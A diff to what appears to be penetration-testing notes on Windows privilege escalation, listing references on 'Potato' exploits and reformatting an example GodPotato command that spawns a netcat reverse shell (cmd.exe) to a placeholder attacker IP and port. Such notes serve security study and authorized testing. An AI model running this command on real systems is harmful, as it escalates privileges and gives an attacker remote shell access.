@@ -342,7 +342,10 @@ Exploit references:
 - https://jlajara.gitlab.io/Potatoes_Windows_Privesc
 - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer
 
-Example with GodPotato: `GodPotato -cmd "c:\path\to\nc.exe -t -e C:\Windows\System32\cmd.exe $AttackerIp $AttackerPort"`
+Example with GodPotato: 
+```
+cmd> .\GodPotato.exe -cmd "c:\path\to\nc.exe -t -e C:\Windows\System32\cmd.exe $AttackerIp $AttackerPort"
+```
 
 ---
 
